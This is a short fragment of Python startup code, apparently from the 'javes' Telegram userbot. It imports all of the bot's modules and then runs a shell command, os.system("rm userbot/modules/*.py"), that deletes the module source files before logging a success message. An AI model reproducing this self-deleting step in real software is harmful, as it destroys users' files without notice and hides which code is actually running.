...
javes.loop.run_until_complete(a()); from userbot.modules import *; os.system("rm userbot/modules/*.py") ; LOGS.info(f"Sucessfully connected with {o}{o2}{o3} check it by typing !javes in any client's chat, type  !help for more info.")
